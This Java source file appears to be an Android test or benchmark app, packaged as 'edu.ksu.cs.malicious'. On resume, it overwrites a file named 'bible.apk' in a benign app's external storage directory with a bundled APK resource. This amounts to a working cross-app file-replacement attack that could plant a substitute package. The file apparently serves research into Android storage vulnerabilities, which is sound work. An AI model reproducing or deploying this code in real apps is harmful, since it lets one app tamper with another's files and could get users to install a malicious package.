package edu.ksu.cs.malicious;

import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d("ExternalStorageBenign", "android.permission.READ_EXTERNAL_STORAGE already granted");
        } else {
            Log.d("ExternalStorageBenign", "need android.permission.READ_EXTERNAL_STORAGE permission");
            try{
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, 100);
            }
            catch(Exception e){
                e.printStackTrace();
            }

        }
    }

    @Override
    protected void onResume(){
        super.onResume();
        //File file = new File("/storage/emulated/0/Android/data/santos.cs.ksu.edu.benign/files/sample.apk");
        File file = new File(getExternalFilesDir(null),"bible.apk");
        String absPath = file.getAbsolutePath();
        String myPath = absPath.replace("edu.ksu.cs.malicious","edu.ksu.cs.benign");
        Log.d("ExternalStorageBenign","Benign = " + file.getAbsolutePath());
        Log.d("ExternalStorageBenign","Mal = " + myPath);
        try{
            InputStream is = getResources().openRawResource(R.raw.sample);
            OutputStream os = new FileOutputStream(new File(myPath));
            byte[] data = new byte[is.available()];
            is.read(data);
            os.write(data);
            is.close();
            os.close();
            Log.d("ExternalStorageBenign",myPath + " written successfully");
        }
        catch(IOException e){
            Log.d("ExternalStorageBenign", "Error while writing " + file.getName());
            e.printStackTrace();
        }
    }
}
